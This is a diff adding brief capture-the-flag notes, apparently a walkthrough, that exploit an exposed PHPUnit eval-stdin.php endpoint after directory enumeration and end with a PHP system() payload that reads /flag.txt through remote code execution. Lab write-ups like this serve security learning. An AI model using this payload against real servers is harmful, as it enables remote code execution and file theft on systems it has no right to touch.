@@ -1,0 +1,6 @@
+dirsearch -u (link)
+first we need (link+/composer.json) check score of the vulnerability
+next we need (link+/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php)
+next burpsuit
+<?php system('cat /flag.txt')?>
+vulnerable to RCE (Remote Code Execution)
